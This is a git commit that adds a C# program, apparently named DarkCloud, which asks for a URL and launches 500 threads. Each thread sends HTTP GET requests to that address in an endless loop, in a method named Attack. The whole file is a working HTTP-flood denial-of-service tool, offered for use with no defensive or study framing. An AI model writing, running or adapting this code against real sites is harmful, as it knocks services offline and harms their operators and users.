7ae1cc97b167c3cfc66d25fa41c22e8ea775f45d
SobirjonovSodiqjonovich <otkirbeksobirjonov@gmail.com>
2022-12-03 02:32:32 +0500

    upload codes

---
+++ src/DarkCloud/Program.cs
@@ -0,0 +1,36 @@
+﻿class Program
+{
+    private static readonly HttpClient _client = new HttpClient();
+    private static int pcBlocks = 500;
+    public static void Main()
+    {
+        Console.Write("Pleace enter url : ");
+        string url = Console.ReadLine()!;
+        Run(url);
+    }
+
+    public static void Run(string url)
+    {
+        for (int i = 0; i < pcBlocks; i++)
+        {
+            Thread thread = new Thread(()=>Attack(url));
+            thread.Start();
+        }
+        Console.ReadLine(); 
+        Console.Write("Successfull");
+    }
+
+    public static void Attack(string url)
+    {
+        while (true)
+        {
+            HttpRequestMessage request = new HttpRequestMessage()
+            {
+                Method = HttpMethod.Get,
+                RequestUri = new Uri(url)
+            };
+            var result = _client.Send(request);
+            Console.WriteLine(result.StatusCode);
+        }
+    }
+}
